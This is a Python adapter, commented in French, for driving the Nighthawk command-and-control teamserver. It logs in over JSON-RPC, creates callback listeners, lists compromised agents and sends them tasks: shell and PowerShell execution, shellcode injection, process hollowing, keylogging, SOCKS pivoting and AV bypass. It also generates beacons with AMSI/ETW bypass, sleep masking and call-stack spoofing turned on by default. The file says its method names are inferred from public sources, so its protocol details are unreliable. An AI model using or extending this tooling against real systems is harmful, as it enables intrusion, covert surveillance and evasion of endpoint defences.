"""
Nighthawk C2 (MDSec) — JSON-RPC 2.0 over HTTPS + WebSocket push.

Nighthawk est un C2 commercial MDSec (concurrent de Cobalt Strike).
Protocole principal : JSON-RPC 2.0 sur HTTPS
Swagger/Redoc       : https://host:port/api/docs
Auth                : Bearer token via RPC method "login" (ou header X-API-Key)
Push events         : WebSocket ws(s)://host:port/events

RPC methods documentées :
  login               → auth → session_token
  Agent_List          → liste des agents actifs
  Agent_Get           → détail d'un agent
  Agent_Task          → envoyer une tâche à un agent
  Agent_Kill          → kill d'un agent
  Agent_GetTaskResult → résultat d'une tâche
  Listener_List       → liste des listeners
  Listener_Create     → créer un listener
  Listener_Delete     → supprimer un listener
  Beacon_Generate     → générer un beacon/payload
  ScreenWatch_Start   → démarrer la capture d'écran
  PushClient_Subscribe→ s'abonner aux events push

Note : Nighthawk n'est pas open-source. Cette implémentation se base sur
les specs JSON-RPC 2.0 et les patterns observés dans les ressources publiques
(Cobalt Strike BOF, MDSec blog). Les noms de méthodes/champs peuvent varier
selon la version du teamserver.
"""
from __future__ import annotations

import asyncio
import itertools
import json
import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

# JSON-RPC 2.0 error codes
_JSONRPC_PARSE_ERROR     = -32700
_JSONRPC_INVALID_REQUEST = -32600
_JSONRPC_METHOD_NOT_FOUND = -32601
_JSONRPC_INVALID_PARAMS  = -32602
_JSONRPC_INTERNAL_ERROR  = -32603
_JSONRPC_AUTH_ERROR      = -32000

# Générateur d'IDs JSON-RPC (thread-safe)
_rpc_id_counter = itertools.count(1)


def _next_rpc_id() -> int:
    return next(_rpc_id_counter)


class NighthawkRPCError(Exception):
    def __init__(self, code: int, message: str, data: Any = None) -> None:
        super().__init__(message)
        self.code    = code
        self.message = message
        self.data    = data


class NighthawkC2(RestC2Interface):
    """
    Nighthawk MDSec — JSON-RPC 2.0 + WebSocket events.

    Paramètres extra (config.extra) :
      api_key        : str   — clé API statique (alternative au login)
      rpc_path       : str   — chemin RPC (défaut: "/api/rpc")
      ws_path        : str   — chemin WebSocket (défaut: "/events")
      verify_ssl     : bool  — vérifier le cert SSL (défaut: False)
      timeout        : float — timeout RPC en secondes (défaut: 30.0)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "agent_kill", "screenshot", "process_list",
        "file_download", "file_upload", "keylog", "inject",
        "pivot_socks", "port_forward", "ws_events",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._rpc_path     = "/api/rpc"
        self._ws_path      = "/events"
        self._rpc_timeout  = 30.0
        self._ws:          Any | None = None
        self._ws_task:     asyncio.Task | None = None
        self._event_callbacks: list[Any] = []

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config      = config
        self._rpc_path    = config.extra.get("rpc_path", "/api/rpc")
        self._ws_path     = config.extra.get("ws_path", "/events")
        self._rpc_timeout = float(config.extra.get("timeout", 30.0))

        verify = config.extra.get("verify_ssl", False)

        # Construire le client HTTP
        self._client = httpx.AsyncClient(
            base_url=config.base_url,
            verify=verify,
            timeout=self._rpc_timeout,
            headers={"Content-Type": "application/json"},
        )

        # Authentification
        api_key = config.extra.get("api_key")
        if api_key:
            self._token = api_key
            self._client.headers.update({"X-API-Key": api_key, "Authorization": f"Bearer {api_key}"})
            logger.info("Nighthawk : authentifié via X-API-Key")
        else:
            token = await self._rpc_login(config)
            self._token = token
            self._client.headers.update({"Authorization": f"Bearer {token}"})
            logger.info("Nighthawk : authentifié via RPC login")

        # Démarrer le WebSocket push en arrière-plan
        if not config.extra.get("disable_ws", False):
            asyncio.create_task(self._connect_ws(config))

        return True

    async def _rpc_login(self, config: C2Config) -> str:
        """Appel RPC 'login' pour obtenir le session token."""
        payload = {
            "jsonrpc": "2.0",
            "id":      _next_rpc_id(),
            "method":  "login",
            "params": {
                "username": config.username or "operator",
                "password": config.password or "",
            },
        }
        try:
            resp = await self._client.post(self._rpc_path, json=payload)
        except httpx.ConnectError as exc:
            raise C2ConnectionError(f"Nighthawk connexion refusée : {exc}") from exc

        if resp.status_code not in (200, 201):
            raise C2AuthError(
                f"Nighthawk auth HTTP échouée [{resp.status_code}]: {resp.text[:200]}"
            )

        data = resp.json()
        if "error" in data:
            err = data["error"]
            raise C2AuthError(
                f"Nighthawk login RPC erreur [{err.get('code')}]: {err.get('message')}"
            )

        result = data.get("result", {})
        token  = (
            result.get("token")
            or result.get("session_token")
            or result.get("access_token")
            or result.get("api_key")
        )
        if not token:
            raise C2AuthError(f"Token Nighthawk absent dans la réponse RPC : {data}")
        return token

    # ── Authentification (compatibilité RestC2Interface) ──────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        return await self._rpc_login(config)

    # ── RPC core ─────────────────────────────────────────────────────────────

    async def _rpc(
        self,
        method: str,
        params: dict[str, Any] | None = None,
        timeout: float | None = None,
    ) -> Any:
        """
        Effectue un appel JSON-RPC 2.0 vers le teamserver Nighthawk.
        Retourne le champ 'result' ou lève NighthawkRPCError.
        """
        self._require_connected()
        payload = {
            "jsonrpc": "2.0",
            "id":      _next_rpc_id(),
            "method":  method,
            "params":  params or {},
        }
        try:
            resp = await self._client.post(
                self._rpc_path,
                json=payload,
                timeout=timeout or self._rpc_timeout,
            )
        except httpx.TimeoutException as exc:
            raise NighthawkRPCError(-1, f"Timeout RPC '{method}'") from exc
        except httpx.RequestError as exc:
            raise C2ConnectionError(f"Nighthawk RPC réseau : {exc}") from exc

        if resp.status_code not in (200, 201, 202):
            raise NighthawkRPCError(
                resp.status_code,
                f"HTTP {resp.status_code} sur méthode '{method}': {resp.text[:200]}",
            )

        data = resp.json()
        if "error" in data and data["error"] is not None:
            err = data["error"]
            raise NighthawkRPCError(
                err.get("code", -1),
                err.get("message", "Erreur RPC inconnue"),
                err.get("data"),
            )
        return data.get("result")

    # ── Listeners ─────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        protocol = config.get("protocol", "https").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 443))
        name     = config.get("name", f"nighthawk-{protocol}-{port}")

        params = {
            "name":             name,
            "protocol":         protocol,
            "bind_address":     host,
            "bind_port":        port,
            "callback_host":    config.get("callback_host", host),
            "callback_port":    port,
            "user_agent":       config.get("user_agent", "Mozilla/5.0"),
            "ssl":              protocol in ("https", "dns-over-https"),
            "sleep_time":       config.get("sleep", 60),
            "jitter":           config.get("jitter", 10),
            "kill_date":        config.get("kill_date", ""),
            "headers":          config.get("headers", []),
            "uri_paths":        config.get("uri_paths", ["/update", "/beacon", "/gate"]),
            "profile":          config.get("profile", "default"),
        }

        result = await self._rpc("Listener_Create", params)
        lid = str(result.get("id") or result.get("listener_id") or uuid.uuid4())

        return Listener(
            id=lid,
            name=result.get("name", name),
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=protocol,
            status="running" if result.get("status", "active") == "active" else "stopped",
            meta={
                "profile":    result.get("profile"),
                "uri_paths":  result.get("uri_paths", []),
            },
        )

    async def remove_listener(self, listener_id: str) -> bool:
        try:
            await self._rpc("Listener_Delete", {"listener_id": listener_id})
            return True
        except NighthawkRPCError as exc:
            logger.error("Nighthawk Listener_Delete : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        result = await self._rpc("Listener_List")
        items  = result if isinstance(result, list) else result.get("listeners", [])
        return [
            Listener(
                id=str(l.get("id") or l.get("listener_id", uuid.uuid4())),
                name=l.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=l.get("bind_address", "0.0.0.0"),
                bind_port=int(l.get("bind_port", 443)),
                protocol=l.get("protocol", "https"),
                status="running" if l.get("status", "active") == "active" else "stopped",
            )
            for l in items
        ]

    # ── Agents ────────────────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        result = await self._rpc("Agent_List")
        items  = result if isinstance(result, list) else result.get("agents", [])
        return [self._parse_agent(a) for a in items]

    def _parse_agent(self, a: dict[str, Any]) -> Implant:
        aid = str(a.get("id") or a.get("agent_id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except (OSError, OverflowError):
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S",
                            "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        # Nighthawk integrity : entier ou string
        integrity_raw = a.get("integrity") or a.get("elevation_level", 0)
        if isinstance(integrity_raw, int):
            integrity = {4: "SYSTEM", 3: "SYSTEM", 2: "ADMIN", 1: "USER", 0: "USER"}.get(
                integrity_raw, "USER"
            )
        else:
            integrity_s = str(integrity_raw).upper()
            if "SYSTEM" in integrity_s:
                integrity = "SYSTEM"
            elif "ADMIN" in integrity_s or "HIGH" in integrity_s:
                integrity = "ADMIN"
            else:
                integrity = "USER"

        return Implant(
            id=aid,
            name=a.get("hostname") or a.get("computer_name") or aid,
            c2_type=self._config.c2_type,
            listener_id=str(a.get("listener_id") or a.get("listener") or ""),
            external_ip=a.get("external_ip") or a.get("remote_ip", ""),
            internal_ip=a.get("internal_ip") or a.get("ip_address", ""),
            hostname=a.get("hostname") or a.get("computer_name", ""),
            username=a.get("username") or a.get("user", ""),
            os=a.get("os") or a.get("operating_system", ""),
            arch=a.get("arch") or a.get("architecture", ""),
            pid=int(a.get("pid") or a.get("process_id", 0)),
            process_name=a.get("process") or a.get("process_name", ""),
            integrity=integrity,
            last_checkin=_dt(a.get("last_checkin") or a.get("last_callback")),
            first_seen=_dt(a.get("first_seen") or a.get("created_at")),
            active=a.get("active", True) and not a.get("dead", False),
            meta={
                "sleep":    a.get("sleep", 60),
                "jitter":   a.get("jitter", 0),
                "beacon_id": a.get("beacon_id"),
                "version":  a.get("version"),
            },
        )

    # ── Tâches ────────────────────────────────────────────────────────────────

    # Mapping commande → type Nighthawk
    _TASK_TYPES: dict[str, str] = {
        "shell":       "ShellExecute",
        "cmd":         "ShellExecute",
        "ps":          "PowerShellExecute",
        "powershell":  "PowerShellExecute",
        "assembly":    "CLRAssembly",
        "inject":      "Inject",
        "shinject":    "ShellcodeInject",
        "hollow":      "ProcessHollow",
        "upload":      "FileUpload",
        "download":    "FileDownload",
        "ls":          "FileList",
        "cd":          "ChangeDirectory",
        "rm":          "FileDelete",
        "cat":         "FileRead",
        "pwd":         "PrintWorkingDirectory",
        "ps_list":     "ProcessList",
        "proc":        "ProcessList",
        "kill":        "ProcessKill",
        "screenshot":  "ScreenCapture",
        "keylog":      "KeylogStart",
        "keylog_stop": "KeylogStop",
        "socks":       "SOCKS5Start",
        "pivot":       "PivotCreate",
        "sleep":       "AgentConfig",
        "exit":        "AgentExit",
        "token":       "TokenManipulate",
        "bypass":      "BypassAV",
        "evasion":     "EvasionConfig",
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "shell"
        task_type = self._TASK_TYPES.get(cmd_lower, "ShellExecute")
        extra     = cmd_parts[1:] + args_list

        # Construire les paramètres selon le type
        task_params: dict[str, Any]
        if task_type in ("ShellExecute", "PowerShellExecute"):
            task_params = {
                "command":   " ".join(extra) if extra else command,
                "timeout":   int(cmd_parts[-1]) if cmd_parts[-1].isdigit() else 60,
                "in_memory": True,
            }
        elif task_type == "CLRAssembly":
            task_params = {
                "assembly": extra[0] if extra else "",
                "args":     extra[1:] if len(extra) > 1 else [],
                "in_memory": True,
                "bypass_amsi": True,
                "bypass_etw":  True,
            }
        elif task_type in ("Inject", "ShellcodeInject", "ProcessHollow"):
            task_params = {
                "pid":      int(extra[0]) if extra and extra[0].isdigit() else 0,
                "arch":     extra[1] if len(extra) > 1 else "x64",
                "payload":  extra[2] if len(extra) > 2 else "",
            }
        elif task_type in ("FileUpload", "FileDownload", "FileRead", "FileList"):
            task_params = {
                "path":      extra[0] if extra else "",
                "dest_path": extra[1] if len(extra) > 1 else "",
            }
        elif task_type == "ScreenCapture":
            task_params = {
                "monitor": int(extra[0]) if extra and extra[0].isdigit() else 0,
                "quality": 85,
            }
        elif task_type == "AgentConfig":
            task_params = {
                "sleep_time": int(extra[0]) if extra else 60,
                "jitter":     int(extra[1]) if len(extra) > 1 else 10,
            }
        elif task_type == "SOCKS5Start":
            task_params = {
                "bind_port": int(extra[0]) if extra else 1080,
            }
        else:
            task_params = {"args": extra}

        result = await self._rpc(
            "Agent_Task",
            {
                "agent_id":   agent_id,
                "task_type":  task_type,
                "parameters": task_params,
            },
            timeout=60.0,
        )

        task_id = str(result.get("task_id") or result.get("id") or uuid.uuid4())
        return Task(
            id=task_id,
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=result.get("status", "queued"),
            meta={"task_type": task_type},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        parts = task_id.split("/")
        if len(parts) == 2:
            agent_id, tid = parts
        else:
            agent_id, tid = "", task_id

        result = await self._rpc(
            "Agent_GetTaskResult",
            {"task_id": tid, "agent_id": agent_id or None},
        )
        return {
            "task_id":  task_id,
            "status":   result.get("status"),
            "output":   result.get("output") or result.get("result", ""),
            "error":    result.get("error", ""),
            "duration": result.get("duration_ms"),
        }

    # ── Payload ───────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()

        fmt_map = {
            "exe":       "Windows/PE",
            "dll":       "Windows/DLL",
            "shellcode": "Windows/Shellcode",
            "elf":       "Linux/ELF",
            "macho":     "macOS/Mach-O",
            "svc":       "Windows/Service",
            "cpl":       "Windows/CPL",
        }
        payload_format = config.extra.get("format_string", fmt_map.get(config.format, "Windows/PE"))

        params = {
            "listener_id":    config.listener_id,
            "format":         payload_format,
            "arch":           config.arch,
            "sleep_time":     config.sleep * 1000,  # Nighthawk = ms
            "jitter":         config.jitter,
            "obfuscation":    config.obfuscation,
            "kill_date":      config.extra.get("kill_date", ""),
            "user_agent":     config.extra.get("user_agent", "Mozilla/5.0"),
            "guard_pages":    config.extra.get("guard_pages", True),
            "acg":            config.extra.get("acg", True),       # Arbitrary Code Guard
            "dynamic_code":   config.extra.get("dynamic_code", False),
            "phantom_dll":    config.extra.get("phantom_dll", False),
            "stomping":       config.extra.get("stomping", False),
            "sleep_mask":     config.extra.get("sleep_mask", "ekko"),  # ekko/foliage/none
            "syscall_type":   config.extra.get("syscall_type", "direct"),  # direct/indirect/ntdll
            "spoof_call_stack": config.extra.get("spoof_call_stack", True),
            "etw_bypass":     config.extra.get("etw_bypass", True),
            "amsi_bypass":    config.extra.get("amsi_bypass", True),
        }

        result = await self._rpc("Beacon_Generate", params, timeout=120.0)

        # La réponse peut contenir les bytes en base64 ou un file_id pour télécharger
        file_id = result.get("file_id") or result.get("download_id")
        if file_id:
            dl_result = await self._rpc("File_Download", {"file_id": file_id})
            b64 = dl_result.get("data", "")
            if b64:
                import base64
                return base64.b64decode(b64)

        b64_data = result.get("data") or result.get("payload_b64", "")
        if b64_data:
            import base64
            return base64.b64decode(b64_data)

        return b""

    # ── WebSocket push events ─────────────────────────────────────────────────

    async def _connect_ws(self, config: C2Config) -> None:
        """Connexion WebSocket pour recevoir les events push en temps réel."""
        try:
            import websockets.client as wsc  # type: ignore
        except ImportError:
            logger.warning("Nighthawk : websockets non installé, pas d'events push")
            return

        scheme = "wss" if config.ssl else "ws"
        url    = f"{scheme}://{config.host}:{config.port}{self._ws_path}"
        import ssl as _ssl
        ssl_ctx = _ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode    = _ssl.CERT_NONE

        while True:
            try:
                async with wsc.connect(
                    url,
                    ssl=ssl_ctx if config.ssl else None,
                    extra_headers={"Authorization": f"Bearer {self._token}"},
                    ping_interval=30,
                    ping_timeout=10,
                ) as ws:
                    logger.info("Nighthawk : WebSocket push connecté → %s", url)
                    async for raw in ws:
                        try:
                            event = json.loads(raw)
                            await self._handle_push_event(event)
                        except json.JSONDecodeError:
                            pass
            except asyncio.CancelledError:
                return
            except Exception as exc:
                logger.warning("Nighthawk WS push déconnecté : %s — retry dans 15s", exc)
                await asyncio.sleep(15)

    async def _handle_push_event(self, event: dict[str, Any]) -> None:
        """Traitement des events WebSocket Nighthawk."""
        event_type = event.get("event_type") or event.get("type", "unknown")
        data       = event.get("data") or event.get("payload", {})
        logger.debug("Nighthawk push event : %s → %s", event_type, data)

        # Notifier les callbacks enregistrés
        for cb in self._event_callbacks:
            try:
                if asyncio.iscoroutinefunction(cb):
                    await cb(event_type, data)
                else:
                    cb(event_type, data)
            except Exception as exc:
                logger.error("Callback Nighthawk event erreur : %s", exc)

    def on_event(self, callback: Any) -> None:
        """Enregistrer un callback pour les events push WebSocket."""
        self._event_callbacks.append(callback)

    async def kill_agent(self, agent_id: str) -> bool:
        """Envoyer la commande d'auto-destruction à un agent."""
        try:
            await self._rpc("Agent_Kill", {"agent_id": agent_id})
            return True
        except NighthawkRPCError as exc:
            logger.error("Nighthawk Agent_Kill : %s", exc)
            return False

    # ── Disconnect ────────────────────────────────────────────────────────────

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._ws_task:
            self._ws_task.cancel()
            try: await self._ws_task
            except asyncio.CancelledError: pass
        if self._client:
            await self._client.aclose()
            self._client = None
        self._status = C2Status.DISCONNECTED

    async def get_status(self) -> C2Status:
        if not self._client:
            return C2Status.DISCONNECTED
        try:
            result = await self._rpc("Agent_List", timeout=5.0)
            return C2Status.CONNECTED if result is not None else C2Status.ERROR
        except NighthawkRPCError:
            return C2Status.ERROR
        except Exception:
            return C2Status.DISCONNECTED

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
